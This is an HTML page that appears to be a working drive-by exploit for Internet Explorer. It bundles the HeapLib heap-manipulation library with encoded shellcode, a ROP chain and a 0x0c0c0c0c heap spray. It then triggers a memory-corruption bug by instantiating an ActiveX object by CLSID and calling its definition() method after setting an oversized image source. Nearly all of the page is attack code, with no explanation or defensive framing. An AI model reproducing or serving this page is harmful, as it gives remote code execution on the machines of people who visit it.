    <html>
    <head>
    <script>
    //
//   JavaScript Heap Exploitation library
//   by Alexander Sotirov <asotirov@determina.com>
//  
//   Version 0.3
//
// Copyright (c) 2007, Alexander Sotirov
// All rights reserved.
// 
// The HeapLib library is licensed under a BSD license, the text of which follows:
// 
// Redistribution and use in source and binary forms, with or without
// modification, are permitted provided that the following conditions
// are met:
// 
// 1. Redistributions of source code must retain the above copyright
//    notice, this list of conditions and the following disclaimer.
// 2. Redistributions in binary form must reproduce the above copyright
//    notice, this list of conditions and the following disclaimer in the
//    documentation and/or other materials provided with the distribution.
// 3. Neither the name of Alexander Sotirov nor the name of Determina Inc.
//    may be used to endorse or promote products derived from this software
//    without specific prior written permission.
// 
// THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
// AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
// IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
// ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE
// LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
// CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
// SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
// INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
// CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
// ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
// POSSIBILITY OF SUCH DAMAGE.
//
 
//
// heapLib namespace
//

function heapLib() {
}


//
// heapLib class
//

// heapLib.ie constructor
//
// Creates a new heapLib API object for Internet Explorer. The maxAlloc
// argument sets the maximum block size that can be allocated using the alloc()
// function.
//
// Arguments:
//    maxAlloc - maximum allocation size in bytes (defaults to 65535)
//    heapBase - base of the default process heap (defaults to 0x150000)
//

heapLib.ie = function(maxAlloc, heapBase) {

    this.maxAlloc = (maxAlloc ? maxAlloc : 65535);
    this.heapBase = (heapBase ? heapBase : 0x150000);

    // Allocate a padding string that uses maxAlloc bytes
    this.paddingStr = "AAAA";

    while (4 + this.paddingStr.length*2 + 2 < this.maxAlloc) {
        this.paddingStr += this.paddingStr;
    }
    
    // Create an array for storing references to allocated memory
    this.mem = new Array();

    // Call flushOleaut32() once to allocate the maximum size blocks
    this.flushOleaut32();
}


//
// Outputs a debugging message in WinDbg. The msg argument must be a string
// literal. Using string concatenation to build the message will result in heap
// allocations.
//
// Arguments:
//    msg - string to output
//

heapLib.ie.prototype.debug = function(msg) {
    void(Math.atan2(0xbabe, msg));
}


//
// Enables or disables logging of heap operations in WinDbg.
//
// Arguments:
//    enable - a boolean value, set to true to enable heap logging
//

heapLib.ie.prototype.debugHeap = function(enable) {

    if (enable == true)
        void(Math.atan(0xbabe));
    else
        void(Math.asin(0xbabe));
}


//
// Triggers a breakpoint in the debugger.
//

heapLib.ie.prototype.debugBreak = function(msg) {
    void(Math.acos(0xbabe));
}


//
// Returns a string of a specified length, up to the maximum allocation size
// set in the heapLib.ie constructor. The string contains "A" characters.
//
// Arguments:
//    len - length in characters
//

heapLib.ie.prototype.padding = function(len) {
    if (len > this.paddingStr.length)
        throw "Requested padding string length " + len + ", only " + this.paddingStr.length + " available";

    return this.paddingStr.substr(0, len);
}


//
// Returns a number rounded up to a specified value.
//
// Arguments:
//    num   - integer to round
//    round - value to round to
//

heapLib.ie.prototype.round = function(num, round) {
    if (round == 0)
        throw "Round argument cannot be 0";

    return parseInt((num + (round-1)) / round) * round;
}


//
// Converts an integer to a hex string. This function uses the heap.
//
// Arguments:
//    num   - integer to convert
//    width - pad the output with zeros to a specified width (optional)
//

heapLib.ie.prototype.hex = function(num, width)
{
    var digits = "0123456789ABCDEF";

    var hex = digits.substr(num & 0xF, 1);

    while (num > 0xF) {
        num = num >>> 4;
        hex = digits.substr(num & 0xF, 1) + hex;
    }

    var width = (width ? width : 0);

    while (hex.length < width)
        hex = "0" + hex;

    return hex;
}


//
// Convert a 32-bit address to a 4-byte string with the same representation in
// memory. This function uses the heap.
//
// Arguments:
//    addr - integer representation of the address
//

heapLib.ie.prototype.addr = function(addr) {
    return unescape("%u" + this.hex(addr & 0xFFFF, 4) + "%u" + this.hex((addr >> 16) & 0xFFFF, 4));
}


//
// Allocates a block of a specified size with the OLEAUT32 alloc function.
//
// Arguments:
//    arg - size of the new block in bytes, or a string to strdup
//    tag - a tag identifying the memory block (optional)
//

heapLib.ie.prototype.allocOleaut32 = function(arg, tag) {

    var size;

    // Calculate the allocation size
    if (typeof arg == "string" || arg instanceof String)
        size = 4 + arg.length*2 + 2;    // len + string data + null terminator
    else
        size = arg;

    // Make sure that the size is valid
    if ((size & 0xf) != 0)
        throw "Allocation size " + size + " must be a multiple of 16";

    // Create an array for this tag if doesn't already exist
    if (this.mem[tag] === undefined)
        this.mem[tag] = new Array();

    if (typeof arg == "string" || arg instanceof String) {
        // Allocate a new block with strdup of the string argument
        this.mem[tag].push(arg.substr(0, arg.length));
    }
    else {
        // Allocate the block
        this.mem[tag].push(this.padding((arg-6)/2));
    }
}


//
// Frees all memory blocks marked with a specific tag with the OLEAUT32 memory
// allocator.
//
// Arguments:
//    tag - a tag identifying the group of blocks to be freed
//

heapLib.ie.prototype.freeOleaut32 = function(tag) {

    delete this.mem[tag];
    
    // Run the garbage collector
    CollectGarbage();
}


//
// The JScript interpreter uses the OLEAUT32 memory allocator for all string
// allocations. This allocator stores freed blocks in a cache and reuses them
// for later allocations. The cache consists of 4 bins, each storing up to 6
// blocks. Each bin holds blocks of a certain size range:
//
//    0 - 32
//    33 - 64
//    65 - 256
//    257 - 32768
//
// When a block is freed by the OLEAUT32 free function, it is stored in one of
// the bins. If the bin is full, the smallest block in the bin is freed with
// RtlFreeHeap() and is replaced with the new block. Chunks larger than 32768
// bytes are not cached and are freed directly.
//
// To flush the cache, we need to free 6 blocks of the maximum size for each
// bin. The maximum size blocks will push out all smaller blocks from the
// cache. Then we allocate the maximum size blocks again, leaving the cache
// empty.
//
// You need to call this function once to allocate the maximum size blocks
// before you can use it to flush the cache.
//

heapLib.ie.prototype.flushOleaut32 = function() {

    this.debug("Flushing the OLEAUT32 cache");

    // Free the maximum size blocks and push out all smaller blocks

    this.freeOleaut32("oleaut32");
    
    // Allocate the maximum sized blocks again, emptying the cache

    for (var i = 0; i < 6; i++) {
        this.allocOleaut32(32, "oleaut32");
        this.allocOleaut32(64, "oleaut32");
        this.allocOleaut32(256, "oleaut32");
        this.allocOleaut32(32768, "oleaut32");
    }
}


//
// Allocates a block of a specified size with the system memory allocator. A
// call to this function is equivalent to a call to HeapAlloc(). If the first
// argument is a number, it specifies the size of the new block, which is
// filled with "A" characters. If the argument is a string, its data is copied
// into a new block of size arg.length * 2 + 6. In both cases the size of the
// new block must be a multiple of 16 and not equal to 32, 64, 256 or 32768.
//
// Arguments:
//    arg - size of the memory block in bytes, or a string to strdup
//    tag - a tag identifying the memory block (optional)
//

heapLib.ie.prototype.alloc = function(arg, tag) {

    var size;

    // Calculate the allocation size
    if (typeof arg == "string" || arg instanceof String)
        size = 4 + arg.length*2 + 2;    // len + string data + null terminator
    else
        size = arg;

    // Make sure that the size is valid
    if (size == 32 || size == 64 || size == 256 || size == 32768)
        throw "Allocation sizes " + size + " cannot be flushed out of the OLEAUT32 cache";

    // Allocate the block with the OLEAUT32 allocator
    this.allocOleaut32(arg, tag);
}


//
// Frees all memory blocks marked with a specific tag with the system memory
// allocator. A call to this function is equivalent to a call to HeapFree().
//
// Arguments:
//    tag - a tag identifying the group of blocks to be freed
//

heapLib.ie.prototype.free = function(tag) {

    // Free the blocks with the OLEAUT32 free function
    this.freeOleaut32(tag);

    // Flush the OLEAUT32 cache
    this.flushOleaut32();
}


//
// Runs the garbage collector and flushes the OLEAUT32 cache. Call this
// function before before using alloc() and free().
//

heapLib.ie.prototype.gc = function() {

    this.debug("Running the garbage collector");
    CollectGarbage();

    this.flushOleaut32();
}


//
// Adds blocks of the specified size to the free list and makes sure they are
// not coalesced. The heap must be defragmented before calling this function.
// If the size of the memory blocks is less than 1024, you have to make sure
// that the lookaside is full.
//
// Arguments:
//    arg    - size of the new block in bytes, or a string to strdup
//    count  - how many free blocks to add to the list (defaults to 1)
//

heapLib.ie.prototype.freeList = function(arg, count) {

    var count = (count ? count : 1);

    for (var i = 0; i < count; i++) {
        this.alloc(arg);
        this.alloc(arg, "freeList");
    }
    this.alloc(arg);

    this.free("freeList");
}


//
// Add blocks of the specified size to the lookaside. The lookaside must be
// empty before calling this function.
//
// Arguments:
//    arg    - size of the new block in bytes, or a string to strdup
//    count  - how many blocks to add to the lookaside (defaults to 1)
//

heapLib.ie.prototype.lookaside = function(arg, count) {

    var size;

    // Calculate the allocation size
    if (typeof arg == "string" || arg instanceof String)
        size = 4 + arg.length*2 + 2;    // len + string data + null terminator
    else
        size = arg;

    // Make sure that the size is valid
    if ((size & 0xf) != 0)
        throw "Allocation size " + size + " must be a multiple of 16";

    if (size+8 >= 1024)
        throw("Maximum lookaside block size is 1008 bytes");

    var count = (count ? count : 1);

    for (var i = 0; i < count; i++)
        this.alloc(arg, "lookaside");

    this.free("lookaside");
}


//
// Return the address of the head of the lookaside linked list for blocks of a
// specified size. Uses the heapBase parameter from the heapLib.ie constructor.
//
// Arguments:
//    arg - size of the new block in bytes, or a string to strdup
//

heapLib.ie.prototype.lookasideAddr = function(arg)
{
    var size;

    // Calculate the allocation size
    if (typeof arg == "string" || arg instanceof String)
        size = 4 + arg.length*2 + 2;    // len + string data + null terminator
    else
        size = arg;

    // Make sure that the size is valid
    if ((size & 0xf) != 0)
        throw "Allocation size " + size + " must be a multiple of 16";

    if (size+8 >= 1024)
        throw("Maximum lookaside block size is 1008 bytes");

    // The lookahead array starts at heapBase + 0x688. It contains a 48 byte
    // structure for each block size + header size in 8 byte increments.

    return this.heapBase + 0x688 + ((size+8)/8)*48;
}


//
// Returns a fake vtable that contains shellcode. The caller should free the
// vtable to the lookaside and use the address of the lookaside head as an
// object pointer. When the vtable is used, the address of the object must be
// in eax and the pointer to the vtable must be in ecx. Any virtual function
// call through the vtable from ecx+8 to ecx+0x80 will result in shellcode
// execution. This function uses the heap.
//
// Arguments:
//    shellcode - shellcode string
//    jmpecx    - address of a jmp ecx or equivalent instruction
//    size      - size of the vtable to generate (defaults to 1008 bytes)
//

heapLib.ie.prototype.vtable = function(shellcode, jmpecx, size) {

    var size = (size ? size : 1008);

    // Make sure the size is valid
    if ((size & 0xf) != 0)
        throw "Vtable size " + size + " must be a multiple of 16";

    if (shellcode.length*2 > size-138)
        throw("Maximum shellcode length is " + (size-138) + " bytes");

    // Build the fake vtable that will go on the lookaside list
    //
    // lookaside ptr  jmp +124  addr of jmp ecx  sub [eax], al*2  shellcode       null
    // 4 bytes        4 bytes   124 bytes        4 bytes          size-138 bytes  2 bytes

    var vtable = unescape("%u9090%u7ceb")   // nop, nop, jmp + 124

    for (var i = 0; i < 124/4; i++)
        vtable += this.addr(jmpecx);

    // If the vtable is the only entry on the lookaside, the first 4 bytes will
    // be 00 00 00 00, which disassembles as two add [eax], al instructions.
    // The jmp ecx trampoline will jump back to the beginning of the vtable and
    // execute the add [eax], al instructions. We need to use two sub [eax], al
    // instructions to fix the heap.

    vtable += unescape("%u0028%u0028") +    // two sub [eax], al instructions
              shellcode + heap.padding((size-138)/2 - shellcode.length);

    return vtable;
}


    var heap_obj = new heapLib.ie(0x20000);
    var code = unescape("%ufd32%ubb67%u4777%u4e4f%u79b3%u257a%u7fb4%u1940%u76e0%u757e%u3d73%u928d%u2d7d%u74b5%u6779%u9125%u699f%ua8f8%ubabb%u4f34%u2705%u0cb4%u97b8%ub666%u31be%u14e1%u3747%ub099%uf939%ufd13%ue38c%u1148%u78d6%ub104%uf51b%u493c%ue218%u7a7f%u7177%ubf43%u98b3%u29b7%u4eeb%u7b93%u2a2f%u4ad4%u33b2%ub9fc%u421c%u7246%u247c%u701d%u900d%u2c96%ud522%u3f4b%u3d15%u359b%u4140%u7ba9%u757c%u417f%u8db4%uf981%ub515%u4fb1%ud33a%u74eb%ue31a%u057d%u2797%ufd85%u0d79%uf580%u9fb6%ue13b%u3077%u35d5%u90a9%u2496%ua82f%ub7bf%u432c%ub84b%u1c47%uf72b%u73e2%u7276%ube2d%ub3b2%u427a%u9891%u4870%ud609%ud287%u71f8%u0467%ub94e%ubb40%u233d%u4afc%u7e9b%u3034%u1dd4%u9299%u66ba%u7837%u493f%u3c93%ub00c%ue021%u1446%u7325%u3272%u75e1%u9966%u67b0%u9290%u9bb3%u9746%u707a%u404b%u9196%ua9ba%u7943%u1a1c%u2ce2%u710c%u2f4f%u6976%ub2f5%ubf3c%u0a0d%u78fd%u487b%u047e%u74a8%u7c42%u8d15%ud403%u4727%ub649%u341d%ub541%ube93%u18b9%u2de3%u9805%ufc2b%uc089%ub7f9%u337f%u4ed5%u2577%u2435%ueb3b%ub137%u3f9f%u7db8%u4a14%ud611%uff88%uc1c7%u3de0%uf829%ub4bb%ub62d%u3172%ue0f6%u6b37%u10f5%u74d4%u7e79%u017a%u3df9%ub127%u2a41%u93fc%u241d%u1273%u7cfd%ud513%u3575%u66b9%ud620%u0d4a%u7db7%u842f%u46e2%u4e78%u0cb5%u80a9%ue3d1%ueb39%u0b49%uf8d3%ub4be%u67b3%u7f14%u7b76%u7071%ub84f%u4842%u779b%u9725%u9091%u4305%ue186%u7172%ub015%ubfa8%ubbba%u7a8d%u921c%u7e99%ub23f%u8c9f%u3ce3%u3479%u9698%u4b7d%u2c76%u047f%u2874%u47e0%u4070%ubebf%u85b0%u22e1%u75d4%u4b40%u15b5%ud083%u47eb%ud61b%u3d7b%u2573%u9bb8%u7890%u7c27%uf502%u1914%u0ce2%ud53a%u492d%ufd81%uba46%ub79f%u2404%u2cb3%u38b6%u4ef8%u7742%u411c%u994a%u98bb%u1d0d%ufc35%u0896%ua8f9%u2fb4%u4334%ub94f%u0592%u3f8d%ub293%u67b1%u4891%u66a9%u3c37%uda97%ud9dd%u2474%u5af4%uc929%u73b1%ub3be%u3b81%u31bb%u1772%u7203%u8317%u7d59%u4ed9%u9661%ub197%u6799%u38c8%u567c%u5fda%ucbf5%u14ea%ue05b%u7981%u734f%u55e7%u3460%u8042%uc54f%u0c62%u0503%uf0e4%u5a59%uc9c6%uaf92%u0d07%u40ce%uc655%uf385%u634a%ucfdb%ua36b%u6f50%uc614%u04a6%uc9ae%ub5f6%u82a5%ubeee%u32e2%u120f%u0ff1%u1f46%ue4c2%uc959%u041a%u3568%u3bf0%ub845%u7b08%u2361%u777f%ude92%u4c78%u04e9%u510c%uce49%ub1b6%u0368%u3120%ue866%u1d26%uef6a%u15eb%u6496%ufa0a%u3e1f%ude29%ue444%u4750%u4b20%u976c%u348c%ud3c8%u203e%ube6a%ud856%u3516%u4ca6%udcae%ue5c8%uf9d9%u9e40%u7295%u594e%ua8d9%u9abf%u0472%u33e8%uc22b%uea2c%ub5aa%uc7af%udaa6%ud914%u4af1%u73fb%u3c01%ue9aa%ued55%u861c%u9802%u9003%u4f52%u52d0%u41f4%u3ff4%ua26e%udfca%uf0ea%u7278%ua6a2%u1a2c%u12af%ue1e2%u48d0%ud373%u6345%ub4d8%ub019%u44de%u5793%u40b4%ufdf3%u1f57%u749b%u0121%u88dd%u0c78%u211d%u38d5%u98b6%uebb1%u3d3e%u0b3a%ub8eb%u867c%u883b%ued73%u0ec8%ued8b%udf3b%u7062%ue0bb%u6374%u1f10%u8c8b%u9146%u5c05%u7eec%u8c85%ue97e%uee25%u810d%u67aa%u3e94%ufd46%ufc35%u8ecb%u93bd%u717f%u07d5%ub14e%u8876%u33da%u2ae3%u5e4a%u40f1%uc968%u4e9d%u2f9a%u9012%u43b7%uae9c%udc51%u2ddb%ud8b4%ubcb0%uc48a%u8e30%ub1d2%ua042%uef83%u522c%u99b5%uad4f%u1c6c%u264f%u47a3%u07d5%u61cf%u87bf%ude7b%uccb2%ud2a7%u9f9c%uc7cf%u8e4b%ue754%u4da1%u1386%u9ca1%u7405%ub7f3%ud62e%u6204%ud75a%ue5ad%u5cab%u713e%ub734%u7dab%ud8a2%u5431%ue638%u409f%ue7ac%u6edf%u64a1%ue458%ua508%u7efd%ub90f%u8715%u4631%u121a%ud8be%u9a96%u782e%u3477%u18c0%uc6e8");
    var nops = unescape("%u0c0c%u0c0c");
    var nops_90 = unescape("%u9248%u4eb1");
    var rop_chain = unescape("%u7f98%u7c34%u6541%u7c37%u8b05%u7c34%u7f98%u7c34%u7f98%u7c34%u7f98%u7c34%u7f98%u7c34%u4c66%u7c36%u4c66%u7c36%u4edc%u7c34%uffff%uffff%u1e05%u7c35%u36e3%u7c35%uffff%uffff%u5255%u7c34%u218e%u7c35%u5937%u7c34%uffc0%uffff%u1eb1%u7c35%uc5b9%u7c36%u1e67%u7c39%u2e58%u7c34%ud202%u7c34%uf8f4%u7c34%u15a2%u7c34%u4edc%u7c34%ua151%u7c37%u8c81%u7c37%u5c30%u7c34");

    while (nops.length < 0x80000) nops += nops;
    while (nops_90.length < 0x80000) nops_90 += nops_90;

    var offset = nops.substring(0, 0x0);
    var nops_padding = nops.substring(0, 0x5f4-code.length-offset.length);
    var shellcode = offset + code + nops_padding + rop_chain + nops_90.substring(0, 0x800-code.length-nops_padding.length-rop_chain.length);


    while (shellcode.length < 0x40000) shellcode += shellcode;
    var block = shellcode.substring(0, (0x80000-6)/2);


    heap_obj.gc();
    for (var z=1; z < 0x230; z++) {
      heap_obj.alloc(block);
    }


    </script>
    </head>
    <body>
    <object classid="clsid:f6D90f11-9c73-11d3-b32e-00C04f990bb4" id="FCZG"></object>
    <script>
    var obj = document.getElementById('FCZG').object;
    var src = unescape("%u0c08%u0c0c");
    while (src.length < 0x1002) src += src;
    src = "\\\\xxx" + src;
    src = src.substr(0, 0x1000 - 10);
    var pic = document.createElement("img");
    pic.src = src;
    pic.nameProp;
    obj.definition(392);
    </script>
    </body>
    </html>
